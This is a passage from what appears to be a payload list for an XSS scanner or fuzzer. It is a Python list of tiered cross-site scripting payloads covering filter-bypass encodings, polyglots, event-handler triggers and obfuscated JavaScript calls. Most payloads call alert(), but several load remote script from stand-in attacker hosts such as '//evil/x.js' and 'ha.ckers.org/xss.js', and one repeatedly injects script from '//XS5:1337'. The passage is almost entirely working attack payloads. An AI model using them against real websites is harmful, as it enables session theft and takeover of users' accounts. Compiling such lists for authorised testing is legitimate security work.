    {"id":"t4_ws_nl",         "pl":'<x%0Aonxxx=1',                                 "tier":4,"type":"html"},
    {"id":"t4_ws_ff",         "pl":'<x%0Conxxx=1',                                 "tier":4,"type":"html"},
    {"id":"t4_ws_cr",         "pl":'<x%0Donxxx=1',                                 "tier":4,"type":"html"},
    {"id":"t4_ws_slash",      "pl":'<x%2Fonxxx=1',                                 "tier":4,"type":"html"},
    # Percent-encoding on tag/attr characters
    {"id":"t4_pct_x",         "pl":'%3Cx onxxx=alert(1)',                           "tier":4,"type":"html"},
    {"id":"t4_pct_x2",        "pl":'<%78 onxxx=1',                                  "tier":4,"type":"html"},
    {"id":"t4_pct_on1",       "pl":'<x %6Fnxxx=1',                                  "tier":4,"type":"html"},
    {"id":"t4_pct_on2",       "pl":'<x o%6Exxx=1',                                  "tier":4,"type":"html"},
    {"id":"t4_pct_on3",       "pl":'<x on%78xx=1',                                  "tier":4,"type":"html"},
    {"id":"t4_pct_eq",        "pl":'<x onxxx%3D1',                                  "tier":4,"type":"html"},
    # Quote injection into attribute with fake attr
    {"id":"t4_fake_attr1",    "pl":"<x 1='1'onxxx=1",                               "tier":4,"type":"html"},
    {"id":"t4_fake_attr2",    "pl":'<x 1="1"onxxx=1',                               "tier":4,"type":"html"},
    {"id":"t4_fake_lt",       "pl":'<x </onxxx=1',                                  "tier":4,"type":"html"},
    {"id":"t4_fake_gt",       "pl":'<x 1=">" onxxx=1',                              "tier":4,"type":"html"},
    {"id":"t4_http_ctx",      "pl":'<http://onxxx%3D1/',                             "tier":4,"type":"html"},
    {"id":"t4_squote_end",    "pl":"<x onxxx=alert(1) 1='",                          "tier":4,"type":"html"},
    # Interesting elements
    {"id":"t4_details",       "pl":'<details open ontoggle=alert(1)>',              "tier":4,"type":"html"},
    {"id":"t4_iframe",        "pl":'<iframe srcdoc="<script>alert(1)</script>">',    "tier":4,"type":"html"},
    {"id":"t4_iframe_srcdoc", "pl":'<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>', "tier":4,"type":"html"},
    {"id":"t4_input",         "pl":'<input autofocus onfocus=alert(1)>',             "tier":4,"type":"html"},
    {"id":"t4_keygen",        "pl":'<keygen autofocus onfocus=alert(1)>',            "tier":4,"type":"html"},
    {"id":"t4_marquee2",      "pl":'<marquee loop=1 width=0 onfinish=alert(1)>',     "tier":4,"type":"html"},
    {"id":"t4_body_resize",   "pl":'<body onresize=alert(1)>press F12!',             "tier":4,"type":"html"},
    {"id":"t4_body_scroll",   "pl":'<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><x id=x>#x', "tier":4,"type":"html"},
    {"id":"t4_body_hash",     "pl":'<body onhashchange=alert(1)><a href=#x>click this!#x', "tier":4,"type":"html"},
    {"id":"t4_menu_show",     "pl":'<menu id=x contextmenu=x onshow=alert(1)>right click me!', "tier":4,"type":"html"},

    # ─────────────────────────────────────────────────────────────────────
    # TIER 5 — advanced / polyglot / obfuscated JS call
    # Handles tight WAF rules, multiple reflection contexts at once.
    # ─────────────────────────────────────────────────────────────────────
    # Polyglot — works in HTML, attr, JS, URL contexts simultaneously
    {"id":"t5_poly",          "pl":"jaVasCript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",'tier':5,"type":"poly"},
    {"id":"t5_gif_poly",      "pl":"GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;", "tier":5,"type":"poly"},
    # Comment-splitting (break keyword filters that block <script>)
    {"id":"t5_comment",       "pl":'<scr<!---->ipt>alert(1)</scr<!---->ipt>',        "tier":5,"type":"html"},
    # javascript: protocol in various elements
    {"id":"t5_a_href",        "pl":'<a href=javascript:alert(1)>click',              "tier":5,"type":"html"},
    {"id":"t5_iframe_js",     "pl":'<iframe src=javascript:alert(1)>',               "tier":5,"type":"html"},
    {"id":"t5_embed_js",      "pl":'<embed src=javascript:alert(1)>',                "tier":5,"type":"html"},
    {"id":"t5_form_js",       "pl":'<form action=javascript:alert(1)><input type=submit>', "tier":5,"type":"html"},
    {"id":"t5_form_btn",      "pl":'<form><button formaction=javascript:alert(1)>click', "tier":5,"type":"html"},
    {"id":"t5_form_input",    "pl":'<form><input formaction=javascript:alert(1) type=submit value=click>', "tier":5,"type":"html"},
    {"id":"t5_form_img",      "pl":'<form><input formaction=javascript:alert(1) type=image value=click>', "tier":5,"type":"html"},
    {"id":"t5_obj_data",      "pl":'<object data=javascript:alert(1)>',              "tier":5,"type":"html"},
    {"id":"t5_math_href",     "pl":'<math><brute href=javascript:alert(1)>click',    "tier":5,"type":"html"},
    {"id":"t5_isindex",       "pl":'<isindex action=javascript:alert(1) type=submit value=click>', "tier":5,"type":"html"},
    {"id":"t5_isidx_form",    "pl":'<isindex formaction=javascript:alert(1) type=submit value=click>', "tier":5,"type":"html"},
    # SVG xlink
    {"id":"t5_svg_xlink",     "pl":'<svg><script xlink:href=data:,alert(1) />',      "tier":5,"type":"html"},
    {"id":"t5_math_xlink",    "pl":'<math><brute xlink:href=javascript:alert(1)>click', "tier":5,"type":"html"},
    {"id":"t5_svg_animate",   "pl":'<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>', "tier":5,"type":"html"},
    # data: URI script loading
    {"id":"t5_script_data1",  "pl":'<script src="data:&comma;alert(1)//',            "tier":5,"type":"html"},
    {"id":"t5_script_data2",  "pl":'"><script src=data:&comma;alert(1)//',            "tier":5,"type":"html"},
    # Obfuscated JS calls (no parens, unicode, base36, array tricks)
    {"id":"t5_backtick",      "pl":"alert`1`",                                        "tier":5,"type":"js"},
    {"id":"t5_parens",        "pl":"(alert)(1)",                                      "tier":5,"type":"js"},
    {"id":"t5_a_eq",          "pl":"a=alert,a(1)",                                    "tier":5,"type":"js"},
    {"id":"t5_find",          "pl":"[1].find(alert)",                                 "tier":5,"type":"js"},
    {"id":"t5_bracket",       "pl":"top[\"al\"+\"ert\"](1)",                          "tier":5,"type":"js"},
    {"id":"t5_regex",         "pl":"top[/al/.source+/ert/.source](1)",                "tier":5,"type":"js"},
    {"id":"t5_unicode",       "pl":"al\\u0065rt(1)",                                  "tier":5,"type":"js"},
    {"id":"t5_octal",         "pl":"top['al\\145rt'](1)",                             "tier":5,"type":"js"},
    {"id":"t5_hex_esc",       "pl":"top['al\\x65rt'](1)",                             "tier":5,"type":"js"},
    {"id":"t5_base36",        "pl":"top[8680439..toString(30)](1)",                   "tier":5,"type":"js"},
    {"id":"t5_url_hash",      "pl":"eval(URL.slice(-8))>#alert(1)",                   "tier":5,"type":"js"},
    {"id":"t5_loc_hash",      "pl":"eval(location.hash.slice(1)>#alert(1)",           "tier":5,"type":"js"},
    # Touch / mobile events
    {"id":"t5_touch_start",   "pl":'<html ontouchstart=alert(1)>',                    "tier":5,"type":"html"},
    {"id":"t5_touch_end",     "pl":'<html ontouchend=alert(1)>',                      "tier":5,"type":"html"},
    {"id":"t5_touch_move",    "pl":'<html ontouchmove=alert(1)>',                     "tier":5,"type":"html"},
    {"id":"t5_orient",        "pl":'<body onorientationchange=alert(1)>',             "tier":5,"type":"html"},
    # Setinterval / persistent XSS probe
    {"id":"t5_setinterval",   "pl":'<svg onload=setInterval(function(){with(document)body.appendChild(createElement(\'script\')).src=\'//XS5:1337\'},0)>', "tier":5,"type":"html"},
    # Tabindex-based focus triggers (common in sanitized but tabindex-allowed contexts)
    {"id":"t5_tab_focus",     "pl":'<a id=x tabindex=1 onfocus=alert(1)></a>',        "tier":5,"type":"attr"},
    {"id":"t5_tab_focusin",   "pl":'<a id=x tabindex=1 onfocusin=alert(1)></a>',      "tier":5,"type":"attr"},
    # Body events that trigger without user interaction
    {"id":"t5_body_msg",      "pl":'<body onmessage=alert(1)>',                       "tier":5,"type":"html"},
    {"id":"t5_body_popstate", "pl":'<body onpopstate=alert(1)>',                      "tier":5,"type":"html"},
    {"id":"t5_body_wheel",    "pl":'<body onwheel=alert(1)>',                         "tier":5,"type":"html"},
    {"id":"t5_body_unload",   "pl":'<body onunhandledrejection=alert(1)><script>fetch(\'//xyz\')</script>', "tier":5,"type":"html"},
    # link/base injection
    {"id":"t5_link_import",   "pl":'<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;', "tier":5,"type":"html"},
    {"id":"t5_base",          "pl":'<base href=//0>',                                 "tier":5,"type":"html"},
    # innerHTML location.hash
    {"id":"t5_inner_hash",    "pl":'innerHTML=location.hash>#<script>alert(1)</script>', "tier":5,"type":"js"},
    # Audio/video with valid src
    {"id":"t5_audio_pause",   "pl":'<audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>', "tier":5,"type":"html"},
    {"id":"t5_audio_play",    "pl":'<audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>', "tier":5,"type":"html"},
    {"id":"t5_audio_canplay", "pl":'<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>', "tier":5,"type":"html"},
    {"id":"t5_audio_oserr",   "pl":'<audio src/onerror=alert(1)>',                    "tier":5,"type":"html"},
    # Additional body event that auto-fires
    {"id":"t5_body_afprint",  "pl":'<body onafterprint=alert(1)>',                    "tier":5,"type":"html"},
    {"id":"t5_body_bfprint",  "pl":'<body onbeforeprint=alert(1)>',                   "tier":5,"type":"html"},
    {"id":"t5_body_bfunload", "pl":"<body onbeforeunload=\"location='javascript:alert(1)'\">", "tier":5,"type":"html"},
    # Script base64/hash loader
    {"id":"t5_script_b64",    "pl":'<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)', "tier":5,"type":"html"},

    # ─────────────────────────────────────────────────────────────────────
    # TIER 4 EXTRA — encoding/null-byte/whitespace bypass (from xssvector list)
    # Null bytes, tab/CR/LF in attribute names, slash separators, quote tricks
    # ─────────────────────────────────────────────────────────────────────
    # Null-byte between attr name and = (IE, Safari)
    {"id":"t4x_null_eq",       "pl":'<img src=1 onerror\x00=alert(0) />',            "tier":4,"type":"html"},
    # Null-byte between = and JS value (IE)
    {"id":"t4x_null_val",      "pl":'<img src=1 onerror=\x00alert(0) />',            "tier":4,"type":"html"},
    # Slash instead of whitespace (all browsers)
    {"id":"t4x_slash_sep",     "pl":'<img/src=1/onerror=alert(0)>',                  "tier":4,"type":"html"},
    # Vertical tab instead of whitespace (IE, Safari)
    {"id":"t4x_vtab",          "pl":'<img\x0bsrc=1\x0bonerror=alert(0)>',           "tier":4,"type":"html"},
    # Quote tricks: single then double (Safari)
    {"id":"t4x_quote_trick",   "pl":'<img src=1\'onerror=\'alert(0)\'>',             "tier":4,"type":"html"},
    # No space at all before onerror
    {"id":"t4x_nospace_err",   "pl":'<img src=1onerror=alert(0)>',                   "tier":4,"type":"html"},
    # Extra < before script (IE, Firefox, Chrome, Safari)
    {"id":"t4x_dbl_lt",        "pl":'<<script>alert(0)</script>',                    "tier":4,"type":"html"},
    # No closing > needed (IE, Firefox, Chrome, Safari)
    {"id":"t4x_no_gt",         "pl":'<img src=1 onerror=alert(0) <',                 "tier":4,"type":"html"},
    # IMG tab-split javascript: protocol
    {"id":"t4x_img_tab",       "pl":'<IMG SRC="jav\tascript:alert(\'XSS\');">',      "tier":4,"type":"html"},
    # IMG newline-split javascript: protocol
    {"id":"t4x_img_nl",        "pl":'<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',  "tier":4,"type":"html"},
    # IMG CR-split javascript: protocol
    {"id":"t4x_img_cr",        "pl":'<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',  "tier":4,"type":"html"},
    # IMG space + &#14; padding before javascript:
    {"id":"t4x_img_chr14",     "pl":'<IMG SRC=" &#14;  javascript:alert(\'XSS\');">',"tier":4,"type":"html"},
    # IMG with triple empty quotes (IE quirk)
    {"id":"t4x_img_triplequot","pl":'<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',      "tier":4,"type":"html"},
    # ScRiPt case mangling classic
    {"id":"t4x_scr_case",      "pl":'<ScRiPt>alert(1)</sCriPt>',                     "tier":4,"type":"html"},
    {"id":"t4x_scr_case2",     "pl":'<sCrIpt>alert(1)</ScRipt>',                     "tier":4,"type":"html"},
    # Style onerror expression (IE7)
    {"id":"t4x_style_expr",    "pl":'<style/onload=prompt(\'XSS\')>',                "tier":4,"type":"html"},
    # CSS expression in style attr (IE)
    {"id":"t4x_css_expr",      "pl":'<div style="width:expression(alert(1))">',      "tier":4,"type":"html"},
    # CSS expression backslash (IE)
    {"id":"t4x_css_bs",        "pl":'<style>body{background-color:expression\\(alert(1))}</style>', "tier":4,"type":"html"},
    # IMG SRC entity-encoded javascript: (all entities)
    {"id":"t4x_img_ent",       "pl":'<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>', "tier":4,"type":"html"},
    # IMG SRC octal-encoded javascript:
    {"id":"t4x_img_oct",       "pl":'<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>', "tier":4,"type":"html"},
    # IMG SRC hex-encoded javascript:
    {"id":"t4x_img_hex",       "pl":'<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>', "tier":4,"type":"html"},
    # BODY ONLOAD!#$% exotic char injection (IE/FF/Chrome/Safari)
    {"id":"t4x_body_exotic",   "pl":'<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>', "tier":4,"type":"html"},
    # iframe tab-obfuscated javascript:
    {"id":"t4x_iframe_tab",    "pl":'<iframe src=j\ta\tv\ta\ts\tc\tr\ti\tp\tt:alert(1)></iframe>', "tier":4,"type":"html"},
    # IMG JaVaScRiPt case mix
    {"id":"t4x_img_jcase",     "pl":'<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',          "tier":4,"type":"html"},
    # vbscript msgbox (IE)
    {"id":"t4x_vbscript",      "pl":'<IMG SRC=\'vbscript:msgbox("XSS")\'>',          "tier":4,"type":"html"},
    # iMg VBS onerror (IE)
    {"id":"t4x_img_vbs",       "pl":'<iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)>',  "tier":4,"type":"html"},
    # Split script via document.write
    {"id":"t4x_docwrite_split","pl":'<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>', "tier":4,"type":"html"},
    # META refresh to javascript:
    {"id":"t4x_meta_js",       "pl":'<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1)">', "tier":4,"type":"html"},
    # META refresh to data: base64
    {"id":"t4x_meta_b64",      "pl":'<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">', "tier":4,"type":"html"},
    # DIV background-image javascript:
    {"id":"t4x_div_bg",        "pl":'<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',  "tier":4,"type":"html"},
    # DIV width expression (IE)
    {"id":"t4x_div_expr",      "pl":'<DIV STYLE="width: expression(alert(\'XSS\'));">',                "tier":4,"type":"html"},
    # STYLE @import javascript:
    {"id":"t4x_import_js",     "pl":'<STYLE>@im\\port\'\\ja\\vasc\\ript:alert("XSS")\';</STYLE>',     "tier":4,"type":"html"},
    # XSS style expression
    {"id":"t4x_xss_expr",      "pl":'<XSS STYLE="xss:expression(alert(\'XSS\'))">',                   "tier":4,"type":"html"},
    # IMG STYLE expression with comment bypass
    {"id":"t4x_img_style_cmt", "pl":'<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">',            "tier":4,"type":"html"},
    # TABLE BACKGROUND javascript:
    {"id":"t4x_table_bg",      "pl":'<TABLE BACKGROUND="javascript:alert(\'XSS\')">',                 "tier":4,"type":"html"},
    # FRAMESET javascript:
    {"id":"t4x_frameset",      "pl":'<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',   "tier":4,"type":"html"},
    # BGSOUND javascript:
    {"id":"t4x_bgsound",       "pl":'<BGSOUND SRC="javascript:alert(\'XSS\');">',                     "tier":4,"type":"html"},
    # LINK stylesheet javascript:
    {"id":"t4x_link_js",       "pl":'<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',       "tier":4,"type":"html"},
    # BASE href javascript:
    {"id":"t4x_base_js",       "pl":'<BASE HREF="javascript:alert(\'XSS\');//">',                     "tier":4,"type":"html"},
    # INPUT IMAGE SRC javascript:
    {"id":"t4x_input_img",     "pl":'<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',           "tier":4,"type":"html"},
    # isindex formaction
    {"id":"t4x_isindex_fa",    "pl":'<isindex formaction="javascript:alert(1)" type=submit value=click>', "tier":4,"type":"html"},
    # object data base64 HTML
    {"id":"t4x_obj_b64",       "pl":'<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>', "tier":4,"type":"html"},
    # embed src base64
    {"id":"t4x_embed_b64",     "pl":'<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',  "tier":4,"type":"html"},
    # iframe data: HTML
    {"id":"t4x_iframe_data",   "pl":'<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>', "tier":4,"type":"html"},
    # comment then script (all browsers)
    {"id":"t4x_cmt_script",    "pl":'<!-- --><script>alert(1);</script><!-- -->',     "tier":4,"type":"html"},
    # style then script (all browsers)
    {"id":"t4x_style_then_scr","pl":'<style><img src="</style><img src=x onerror=alert(123)//">',  "tier":4,"type":"html"},
    # comment then img (all browsers)
    {"id":"t4x_cmt_img",       "pl":'<!--<img src="--><img src=x onerror=alert(123)//">',          "tier":4,"type":"html"},
    # CDATA script split (XML context)
    {"id":"t4x_cdata_split",   "pl":'<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert(\'XSS\');">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>', "tier":4,"type":"html"},
    # input onfocus autofocus (no interaction needed)
    {"id":"t4x_input_af_focus","pl":'<input onfocus=write(XSS) autofocus>',           "tier":4,"type":"html"},
    # input onblur pair
    {"id":"t4x_input_blur",    "pl":'<input onblur=write(XSS) autofocus><input autofocus>', "tier":4,"type":"html"},
    # select onfocus eval fromCharCode
    {"id":"t4x_select_eval",   "pl":'<select onfocus=javascript:eval(String[\'fromCharCode\'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>', "tier":4,"type":"attr"},
    # textarea onfocus eval
    {"id":"t4x_textarea_eval", "pl":'<textarea onfocus=javascript:eval(String[\'fromCharCode\'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>', "tier":4,"type":"attr"},
    # keygen onfocus eval
    {"id":"t4x_keygen_eval",   "pl":'<keygen onfocus=javascript:eval(String[\'fromCharCode\'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>', "tier":4,"type":"attr"},
    # video poster javascript: (eval fromCharCode)
    {"id":"t4x_video_poster",  "pl":'<video poster=javascript:eval(String[\'fromCharCode\'](97,108,101,114,116,40,39,120,115,115,39,41,32))//>', "tier":4,"type":"html"},
    # video source onerror eval
    {"id":"t4x_video_src_err", "pl":'<video><source onerror="javascript:eval(String[\'fromCharCode\'](97,108,101,114,116,40,39,120,115,115,39,41,32))">',  "tier":4,"type":"html"},
    # body onscroll eval + br flood
    {"id":"t4x_body_scroll_ev","pl":'<body onscroll=alert(XSS)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>', "tier":4,"type":"html"},
    # form button formaction javascript:
    {"id":"t4x_btn_formact",   "pl":'<form id="test"/><button form="test" formaction="javascript:alert(123)">X', "tier":4,"type":"html"},
    # frameset onload
    {"id":"t4x_frameset_load", "pl":'<frameset onload=alert(123)>',                   "tier":4,"type":"html"},

    # ─────────────────────────────────────────────────────────────────────
    # TIER 5 EXTRA — advanced encoding, protocol, obfuscation, Unicode tricks
    # Payloads that require multi-step decoding or rare browser behaviours
    # ─────────────────────────────────────────────────────────────────────
    # String.fromCharCode execution
    {"id":"t5x_sfc_script",    "pl":'<SCRIPT>String.fromCharCode(97,108,101,114,116,40,49,41)</SCRIPT>', "tier":5,"type":"js"},
    {"id":"t5x_sfc_img",       "pl":'<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>', "tier":5,"type":"html"},
    # eval(String['fromCharCode'](...)) via input autofocus
    {"id":"t5x_sfc_eval_af",   "pl":'<input onfocus=javascript:eval(String[\'fromCharCode\'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>', "tier":5,"type":"attr"},
    # UTF-7 encoded payload
    {"id":"t5x_utf7",          "pl":'+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-', "tier":5,"type":"html"},
    # Double-percent encoded
    {"id":"t5x_dbl_pct",       "pl":'%253cscript%253ealert(1)%253c/script%253e',      "tier":5,"type":"html"},
    # Unicode fullwidth <> (%uff1c %uff1e)
    {"id":"t5x_unicode_fw",    "pl":'%uff1cscript%uff1ealert(1)%uff1c/script%uff1e',  "tier":5,"type":"html"},
    # Overlong UTF-8 < = %C0%BC
    {"id":"t5x_overlong",      "pl":'%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE', "tier":5,"type":"html"},
    # Non-alphanumeric JS (JSF*ck style, partial)
    {"id":"t5x_jsfuck_alert",  "pl":'<script>({0:#0=alert/#0#/#0#(0)})</script>',    "tier":5,"type":"js"},
    # JS: eval chain obfuscation
    {"id":"t5x_eval_chain",    "pl":'<script>a="get";b="URL(\"";c="javascript:";d="alert(\'XSS\');\")";eval(a+b+c+d);</script>', "tier":5,"type":"js"},
    # Regex source concat
    {"id":"t5x_regex_src",     "pl":'<SCRIPT>a=/XSS/;alert(a.source)</SCRIPT>',       "tier":5,"type":"js"},
    # SVG script xlink href data:
    {"id":"t5x_svg_xlink_data","pl":'<svg><script xlink:href="data:,alert(1)">',      "tier":5,"type":"html"},
    # math xlink href jsfiddle (external load probe)
    {"id":"t5x_math_xlink_jf", "pl":'<math><a xlink:href="//jsfiddle.net/t846h/">click', "tier":5,"type":"html"},
    # embed SVG base64 allowscriptaccess
    {"id":"t5x_embed_svg_b64", "pl":'<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>', "tier":5,"type":"html"},
    # object data base64 SVG
    {"id":"t5x_obj_svg_b64",   "pl":'<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>', "tier":5,"type":"html"},
    # iframe srcdoc body onload
    {"id":"t5x_srcdoc_body",   "pl":'<iframe srcdoc=\'&lt;body onload=prompt&lpar;1&rpar;&gt;\'>',  "tier":5,"type":"html"},
    # iframe NewLine/Tab obfuscated javascript: src
    {"id":"t5x_iframe_nltab",  "pl":'<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t%28&NewLine;1%29></iframe>', "tier":5,"type":"html"},
    # a href data: base64 SVG/onload
    {"id":"t5x_a_data_b64",    "pl":'<a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+">X</a>', "tier":5,"type":"html"},
    # meta refresh url=;URL=javascript: (double URL IE)
    {"id":"t5x_meta_dbl_url",  "pl":'<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">', "tier":5,"type":"html"},
    # window[] bracket notation
    {"id":"t5x_win_bracket",   "pl":'<script>window[\'alert\'](0)</script>',           "tier":5,"type":"js"},
    # parent/self/top bracket
    {"id":"t5x_parent_br",     "pl":'<script>parent[\'alert\'](1)</script>',           "tier":5,"type":"js"},
    {"id":"t5x_top_br",        "pl":'<script>top[\'alert\'](3)</script>',              "tier":5,"type":"js"},
    # Split alert across lang attrs
    {"id":"t5x_split_lang",    "pl":'<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>', "tier":5,"type":"html"},
    # html5 video meta onloadedmetadata
    {"id":"t5x_video_meta",    "pl":'<video src="http://www.w3schools.com/html5/movie.ogg" onloadedmetadata="alert(1)" />', "tier":5,"type":"html"},
    # blah style expression (IE non-existent element)
    {"id":"t5x_blah_expr",     "pl":'<blah style="blah:expression(alert(1))" />',      "tier":5,"type":"html"},
    # CSS z:exp/**/res/**/sion (IE, comment bypass)
    {"id":"t5x_css_cmt_expr",  "pl":'<div style="z:exp/*anything*/res/*here*/sion(alert(1))" />', "tier":5,"type":"html"},
    # two-stage eval(location.hash)
    {"id":"t5x_hash_eval_scr", "pl":'<script>eval(location.hash.slice(1))</script>',  "tier":5,"type":"js"},
    # two-stage innerHTML=location.hash
    {"id":"t5x_inner_hash2",   "pl":'<script>innerHTML=location.hash</script>#<script>alert(1)</script>', "tier":5,"type":"js"},
    # script for=document event=onreadystatechange (IE)
    {"id":"t5x_scr_for_evt",   "pl":'<script for=document event=onreadystatechange>alert(1)</script>', "tier":5,"type":"html"},
    # img src + onerror jQuery getScript (external load)
    {"id":"t5x_jquery_gs",     "pl":'<img src=1 onerror=jQuery.getScript("//evil/x.js")>', "tier":5,"type":"html"},
    # img src + onerror createElement script (classic DOM write)
    {"id":"t5x_dom_script",    "pl":'<img src=x onerror=document.body.appendChild(document.createElement(\'script\')).src=\'//evil/x.js\'>', "tier":5,"type":"html"},
    # textarea autofocus write
    {"id":"t5x_textarea_write","pl":'<textarea id=ta onfocus="write(\'<script>alert(1)</script>\')" autofocus></textarea>', "tier":5,"type":"html"},
    # iframe src 404 + onload write (DOM clobbering context)
    {"id":"t5x_iframe_404_wrt","pl":'<iframe src="404" onload="write(\'<script>alert(1)<\\/script>\')"></iframe>', "tier":5,"type":"html"},
    # SVG onload xmlns
    {"id":"t5x_svg_xmlns_load","pl":'<svg onload="javascript:alert(123)" xmlns="#"></svg>',  "tier":5,"type":"html"},
    # iframe xmlns javascript:
    {"id":"t5x_iframe_xmlns",  "pl":'<iframe xmlns="#" src="javascript:alert(1)"></iframe>',  "tier":5,"type":"html"},
    # object data javascript: unicode
    {"id":"t5x_obj_js_uni",    "pl":'<object data=javascript:\u0061\u006c\u0065\u0072\u0074(1)>',  "tier":5,"type":"html"},
    # form action javascript: + input submit
    {"id":"t5x_form_act_js",   "pl":'<form action=javascript:alert(1)><input type=submit>',        "tier":5,"type":"html"},
    # isindex action javascript:
    {"id":"t5x_isindex_act",   "pl":'<isindex action="javascript:alert(1)" type=image>',           "tier":5,"type":"html"},
    # script crypto (Firefox old)
    {"id":"t5x_crypto",        "pl":'<script>crypto.generateCRMFRequest(\'CN=0\',0,0,null,\'alert(1)\',384,null,\'rsa-dual-use\')</script>', "tier":5,"type":"js"},
    # SVG script ? (Opera)
    {"id":"t5x_svg_scr_q",     "pl":'<svg><script ?>alert(1)',                         "tier":5,"type":"html"},
    # Non-alphanumeric JS crazy (partial jsfuck)
    {"id":"t5x_noalpha_js",    "pl":'<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$};$.$$=$.$+(!""+"")[0]+$._+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_+"(1)"+"\"")())()</script>', "tier":5,"type":"js"},
    # a href about: script (IE)
    {"id":"t5x_about_script",  "pl":'<a href="about:<script>alert(1);</script>">X</a>', "tier":5,"type":"html"},
    # div binding: url() (Firefox old)
